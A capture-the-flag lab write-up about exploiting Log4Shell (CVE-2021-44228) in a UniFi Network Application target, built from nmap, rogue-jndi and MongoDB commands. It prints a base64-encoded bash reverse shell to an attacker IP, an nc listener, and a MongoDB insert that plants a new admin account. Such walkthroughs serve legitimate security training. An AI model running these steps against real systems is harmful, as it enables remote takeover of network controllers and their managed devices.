#Linux #CVE-2021-44228


**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.129.18.96
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)

OPEN PORTS

* 22/tcp   open  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
* 6789/tcp open  ibm-db2-admin?
* 8080/tcp open  http-proxy
* 8443/tcp open  ssl/nagios-nsca Nagios NSCA
* 8843/tcp open  ssl/unknown
* 8880/tcp open  cddbp-alt?

We'll follow procedure described in the following article:

https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

Our action plan is to get a reverse shell so we can interact with the underlying Linux operating system

As outlined in the article, the vulnerability is in the **REMEMBER** values (which is the **PAYLOAD**). The picture below shows the POST request:

![image](https://user-images.githubusercontent.com/99097743/170084790-6d97d79b-23e0-4195-8b0a-2659b657123d.png)


```sh
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
 ```
 
 ![image](https://user-images.githubusercontent.com/99097743/170054746-daa8621e-f227-45a2-bd18-b3a3078ac94c.png)
 
It seems that Maven (MVN) is not installed in our localhost, we need to install it first.  
  
```sh
sudo apt-get install maven 

```
  
Reverse shell command: 

```sh
echo 'bash -c bash -i >&/dev/tcp/10.10.16.26/4444 0>&1' | base64
#This command will generate a base64 encrypted string

#To start the rogue-jndi LDAP server up
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjYvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.26"

# Make sure to change the directory, base64 hash, and IP address --> VPN IP
```
![image](https://user-images.githubusercontent.com/99097743/170090287-67ec5abc-f682-4f88-9d11-3f771d3540ef.png)

#Start listening on a new terminal


```sh
sudo nc -nvlp 4444
```

We can now include payload in the REMEMBER value (see the highlighted section in the picture below) and trigger the reverse shell. In other words, the UniFi Network Application will grab the payload from rogue-jndi and then we'll get a callback in the listener terminal:

![image](https://user-images.githubusercontent.com/99097743/170090226-80b9baf1-eecb-4ab5-b48c-999f7f3cc84c.png)

Nice, we are connected!

![image](https://user-images.githubusercontent.com/99097743/170091118-34190c19-c520-427d-a778-705da14fa00d.png)

Python is not installed so please try the following command to improve the shell

```sh
script /dev/null -c bash

```
I followed the article for the next steps. We can either;
'
* Extract admin hashes and crack them (requires significant computing power -- I gave up on this)
* Add a new admin account  

First, we need to generate a password hash for the admin account:

```sh
mkpasswd -m sha-512 password
  ```
  
Next, we need to enter the new admin command (db.admin.insert) in MongoDB via our reverse shell (username = aaa)

```sh
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "aaa@localhost.local", "last_site_name" : "default", "name" : "aaa", "time_created" : NumberLong(100019800), "x_shadow" : "$6$piDZ3bwwj/g4psku$MSgskX71AEuwT/sASoYqbZ03ZiRtxtTl/OROc8mBDP4QKwAeB1VGBtIlJdEs5q7rDFpHq7dkM2dAZk/KEhRgx." })'
  ```
Once the new admin account is inserted in the MongoDB, we are ready to login to the UniFi Network Account (username: aaa, pasword: password)
Unfortunately the website did not work so I captured the flag from the official walkthorough document :)
  
![image](https://user-images.githubusercontent.com/99097743/170099143-838be26d-0d3a-479c-a619-2c1aef01ceec.png)
